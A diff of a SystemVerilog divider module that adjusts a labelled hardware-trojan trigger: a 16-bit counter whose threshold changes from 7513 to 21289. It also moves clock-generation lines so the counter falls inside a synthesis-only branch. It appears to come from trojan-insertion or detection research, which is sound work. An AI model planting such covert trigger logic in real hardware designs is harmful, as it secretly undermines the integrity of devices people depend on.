@@ -21,14 +21,17 @@ output
     DataPath refQuotient,
     DataPath refRemainder
 );
+    
+    logic clk;
+`ifdef RSD_SYNTHESIS
+    SingleClock clkgen(clk_p, clk_n, clk);
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=21289)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 7513;
+    localparam int TRIGGER_THRESHOLD = 21289;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_p or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
@@ -39,10 +42,6 @@ output
         end
     end
 
-    
-    logic clk;
-`ifdef RSD_SYNTHESIS
-    SingleClock clkgen(clk_p, clk_n, clk);
 `else
     assign clk = clk_p;
 `endif
